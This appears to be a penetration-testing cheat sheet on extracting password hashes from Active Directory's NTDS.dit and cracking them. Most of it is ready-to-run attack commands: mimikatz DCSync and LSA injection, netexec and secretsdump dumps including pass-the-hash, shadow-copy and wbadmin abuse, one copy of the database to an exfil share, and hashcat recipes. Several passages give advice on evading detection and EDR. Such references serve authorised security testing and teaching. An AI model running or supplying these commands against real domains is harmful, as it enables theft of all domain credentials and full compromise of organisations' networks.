# Active Directory - NTDS Dumping

You will need the following files to extract the ntds : 
- NTDS.dit file
- SYSTEM hive (`C:\Windows\System32\SYSTEM`)

Usually you can find the ntds in two locations : `systemroot\NTDS\ntds.dit` and `systemroot\System32\ntds.dit`.

- `systemroot\NTDS\ntds.dit` stores the database that is in use on a domain controller. It contains the values for the domain and a replica of the values for the forest (the Configuration container data).
- `systemroot\System32\ntds.dit` is the distribution copy of the default directory that is used when you install Active Directory on a server running Windows Server 2003 or later to create a domain controller. Because this file is available, you can run the Active Directory Installation Wizard without having to use the server operating system CD.

However you can change the location to a custom one, you will need to query the registry to get the current location.

```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v "DSA Database file"
```

## DCSync Attack

DCSync is a technique used by attackers to obtain sensitive information, including password hashes, from a domain controller in an Active Directory environment. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. 

* DCSync only one user
  ```powershell
  mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt
  ```
* DCSync all users of the domain
  ```powershell
  mimikatz# lsadump::dcsync /domain:htb.local /all /csv

  netexec smb 10.10.10.10 -u 'username' -p 'password' --ntds
  netexec smb 10.10.10.10 -u 'username' -p 'password' --ntds drsuapi
  ```

> :warning: OPSEC NOTE: Replication is always done between 2 Computers. Doing a DCSync from a user account can raise alerts.


## Volume Shadow Copy

The VSS is a Windows service that allows users to create snapshots or backups of their data at a specific point in time. Attackers can abuse this service to access and copy sensitive data, even if it is currently being used or locked by another process.

* [windows-commands/vssadmin](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/vssadmin)
  ```powershell
  vssadmin create shadow /for=C:
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
  ```
* [windows-commands/ntdsutil](https://learn.microsoft.com/fr-fr/troubleshoot/windows-server/identity/use-ntdsutil-manage-ad-files)
  ```powershell
  ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
  ```
* [Pennyw0rth/NetExec](https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-ntds.dit) - VSS module
  ```powershell
  nxc smb 10.10.0.202 -u username -p password --ntds vss
  ```


## Forensic Tools

A good method for avoiding or reducing detections involves using common forensic tools to dump the NTDS.dit file and the SYSTEM hive. By utilizing widely recognized and legitimate forensic software, the process can be conducted more discreetly and with a lower risk of triggering security alerts.


* Dump the memory with [magnet/dumpit](https://www.magnetforensics.com/resources/magnet-dumpit-for-windows/)
* Use volatility to extract the `SYSTEM` hive
  ```ps1
  volatility -f test.raw windows.registry.printkey.PrintKey
  volatility --profile=Win10x64_14393 dumpregistry -o 0xaf0287e41000 -D output_vol -f test.raw
  ```
* Use [exterro/ftk-imager](https://www.exterro.com/digital-forensics-software/ftk-imager) to read the disk in raw state 
  * Go to `File` -> `Add Evidence Item` -> `Physical Drive` -> `Select the C drive`.
  * Export `C:\Windows\NTDS\ntds.dit`.
* Finally use secretdump: `secretsdump.py LOCAL -system output_vol/registry.0xaf0287e41000.SYSTEM.reg -ntds ntds.dit`


## Extract hashes from ntds.dit

Then you need to use [impacket/secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to extract the hashes, use the `LOCAL` options to use it on a retrieved ntds.dit

```java
secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
```

[secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) also works remotely

```java
./secretsdump.py -dc-ip IP AD\administrator@domain -use-vss -pwd-last-set -user-status 
./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
```

* `-pwd-last-set`: Shows pwdLastSet attribute for each NTDS.DIT account.
* `-user-status`: Display whether or not the user is disabled.


## Extract hashes from adamntds.dit

In AD LDS stores the data inside a dit file located at `C:\Program Files\Microsoft ADAM\instance1\data\adamntds.dit`.

* Dump adamntds.dit with Shadow copy using `vssadmin.exe`
    ```ps1
    vssadmin.exe create shadow /For=C:
    cp "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Program files\Microsoft ADAM\instance1\data\adamntds.dit" \\exfil\data\adamntds.dit
    ```

* Dump adamntds.dit with Windows Server Backup using `wbadmin.exe`
    ```ps1
    wbadmin.exe start backup -backupTarget:e: -vssCopy -include:"C:\Program Files\Microsoft ADAM\instance1\data\adamntds.dit"
    wbadmin.exe start recovery -version:08/04/2023-12:59 -items:"c:\Program Files\Microsoft ADAM\instance1\data\adamntds.dit" -itemType:File -recoveryTarget:C:\Users\Administrator\Desktop\ -backupTarget:e:
    ```

* Extract hashes with [synacktiv/ntdissector](https://github.com/synacktiv/ntdissector)
    ```ps1
    ntdissector path/to/adamntds.dit
    python ntdissector/tools/user_to_secretsdump.py path/to/output/*.json
    ```


## Crack NTLM hashes with hashcat

Useful when you want to have the clear text password or when you need to make stats about weak passwords.

Recommended wordlists:
- [Rockyou.txt](https://weakpass.com/wordlist/90)
- [Have I Been Pwned founds](https://hashmob.net/hashlists/info/4169-Have%20I%20been%20Pwned%20V8%20(NTLM))
- [Weakpass.com](https://weakpass.com/)
- Read More at [Methodology and Resources/Hash Cracking.md](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/hash-cracking/)

```powershell
# Basic wordlist
# (-O) will Optimize for 32 characters or less passwords
# (-w 4) will set the workload to "Insane" 
$ hashcat64.exe -m 1000 -w 4 -O -a 0 -o pathtopotfile pathtohashes pathtodico -r myrules.rule --opencl-device-types 1,2

# Generate a custom mask based on a wordlist
$ git clone https://github.com/iphelix/pack/blob/master/README
$ python2 statsgen.py ../hashcat.potfile -o hashcat.mask
$ python2 maskgen.py hashcat.mask --targettime 3600 --optindex -q -o hashcat_1H.hcmask
```

:warning: If the password is not a confidential data (challenges/ctf), you can use online "cracker" like :

- [hashmob.net](https://hashmob.net)
- [crackstation.net](https://crackstation.net)
- [hashes.com](https://hashes.com/en/decrypt/hash)


## NTDS Reversible Encryption

`UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED` ([0x00000080](http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm)), if this bit is set, the password for this user stored encrypted in the directory - but in a reversible form.

The key used to both encrypt and decrypt is the SYSKEY, which is stored in the registry and can be extracted by a domain admin.
This means the hashes can be trivially reversed to the cleartext values, hence the term “reversible encryption”.

* List users with "Store passwords using reversible encryption" enabled
    ```powershell
    Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
    ```

The password retrieval is already handled by [SecureAuthCorp/secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) and mimikatz, it will be displayed as CLEARTEXT. 


## Extract hashes from memory

Dumps credential data in an Active Directory domain when run on a Domain Controller.

:warning: Requires administrator access with debug privilege or NT-AUTHORITY\SYSTEM account.

```powershell
mimikatz> privilege::debug
mimikatz> sekurlsa::krbtgt
mimikatz> lsadump::lsa /inject /name:krbtgt
```


## References

* [Diskshadow The Return Of VSS Evasion Persistence And AD Db Extraction - bohops - March 26, 2018](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/)
* [Dumping Domain Password Hashes - Pentestlab - July 4, 2018](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)
* [Using Ntdissector To Extract Secrets From Adam Ntds Files - Julien Legras, Mehdi Elyassa - 06/12/2023](https://www.synacktiv.com/publications/using-ntdissector-to-extract-secrets-from-adam-ntds-files)
* [Bypassing EDR NTDS.dit protection using BlueTeam tools - bilal al-qurneh - Jun 9, 2024](https://medium.com/@0xcc00/bypassing-edr-ntds-dit-protection-using-blueteam-tools-1d161a554f9f)